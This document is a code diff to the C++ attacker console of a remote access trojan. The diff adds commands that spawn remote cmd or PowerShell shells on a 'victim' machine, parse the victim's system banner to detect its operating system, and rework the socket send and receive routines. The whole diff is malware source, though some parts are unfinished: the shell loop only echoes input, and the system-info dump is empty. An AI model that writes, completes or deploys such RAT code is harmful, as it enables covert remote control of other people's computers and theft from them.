@@ -16,6 +16,7 @@
 #endif
 
 class Attacker {
+    std::string operatingSystem;
     std::string ipAddr;
     int port;
     static bool hasConnection;
@@ -27,28 +28,30 @@ class Attacker {
         memset(this->buffer, NULL, BUFFER_LENGTH);
     }
     bool sendData(std::string buffer){
-        int iSend = send(this->clientSock, buffer.c_str(), buffer.size() + 1, 0);
-        if (iSend <= SOCKET_ERROR) {
+        int iSend = send(clientSock, buffer.c_str(), buffer.size() + 1, 0);
+        if (iSend == SOCKET_ERROR) {
             std::cout << "[!] Unable to send data to server " << ipAddr << " on port " << port << std::endl;
         #ifdef _WIN32
             std::cout << "[!] Error: " << WSAGetLastError() << std::endl;
         #endif
             return false;
         }
+        std::cout << "Data " << buffer << " sent to " << ipAddr << " successfully!\n";
         return true;
     }
-    bool recvData(){
-        int iRecv = recv(clientSock, buffer, BUFFER_LENGTH, 0);
-        if (iRecv <= SOCKET_ERROR) {
+    std::string recvData(){
+        int iRecv;
+        char newBuff[BUFFER_LENGTH] = { 0 };
+        iRecv = recv(clientSock, newBuff, BUFFER_LENGTH, 0);
+        if (iRecv == SOCKET_ERROR) {
             std::cout << "[!] Unable to receive data from server " << ipAddr << " on port " << port << std::endl;
             hasBeenCreated--;
         #ifdef _WIN32
             std::cout << "[!] Error: " << WSAGetLastError() << std::endl;
         #endif
-            clearBuffer();
-            return false;
+            return "";
         }
-        return true;
+        return newBuff;
     }
     int displayMenu(){
         int uChoice;
@@ -65,7 +68,7 @@ class Attacker {
         std::cout << "0. Exit\n\n";
         std::cout << "> Enter choice: ";
         std::cin >> uChoice;
-        while(uChoice <= 0 || uChoice > 9){
+        while(uChoice < 0 || uChoice > 9){
             std::cin.clear();
             std::cin.ignore(INT_MAX, '\n');
             std::cout << "[!] Invalid Choice. Try again: ";
@@ -140,18 +143,29 @@ public:
     }
 
     void invokeShell(bool ps=false){
-        const char* cmd = "GET shell";
+        std::string cmd = "invoke-";
+        if(ps)
+            cmd += "ps-";
+        cmd += "shell";
+        
         if(!sendData(cmd)){
             std::cout << "[!] Unable to invoke shell!\n";
             return;
         }
-        if(!recvData()){
+        std::string prompt = recvData();
+        if(prompt == ""){
             std::cout << "[!] Unable to receive data from server. Try re-establishing connection by restarting the RAT.\n";
             return;
         }
-        std::cout << "[=] Spawned Shell. To exit shell, type shellexit\n.[*] Note: If no output is returned, that means the command doesn't exist or an error has occurred. I didn't include the returning of stderr from the victim.\n\n";
-        char* shell = buffer;
-        printf("%s", shell);
+        std::cout << "[=] Spawned Shell. To exit shell, type shellexit.\n[*] Note: If no output is returned, that means the command doesn't exist or an error has occurred. I didn't include the returning of stderr from the victim.\n\n";
+        std::cout << "\n\n";
+        std::string uInput;
+        do{
+            std::cout << prompt;
+            std::cin.ignore();
+            std::getline(std::cin, uInput);
+            std::cout << uInput << std::endl;
+        }while(uInput != "shellexit");
     }
     void dumpsysinfo(){}
     void getBanner(){
@@ -160,10 +174,17 @@ public:
             return;
         }
         std::cout << "[*] Fetching system info\n";
-        recvData();
-        printf("%s", buffer);
-        int uChoice = displayMenu();
+        std::string banner = recvData();
+        std::cout << banner;
+
+        if (banner.find("Windows") != std::string::npos)
+            operatingSystem = "Windows";
+        else if (banner.find("Linux") != std::string::npos)
+            operatingSystem = "Linux";
+
+        int uChoice;
         do{
+            uChoice = displayMenu();
             switch(uChoice){
                 case 0:
                 std::cout << "You chose to exit!\n";
@@ -181,10 +202,18 @@ public:
                 exit(0);
                     break;
                 case 1:
-                invokeShell();
+                    invokeShell();
                     break;
                 case 2:
-                invokeShell(true);
+                    if(operatingSystem == "Windows")
+                        invokeShell(true);
+                    else{
+                        std::cout << std::endl;
+                        Helpers::divider();
+                        std::cout << "[!] Cannot run a powershell instance on a " << operatingSystem << " machine!\n";
+                        Helpers::divider();
+                        std::cout << std::endl;
+                    }
                     break;
                 case 3:
                 dumpsysinfo();
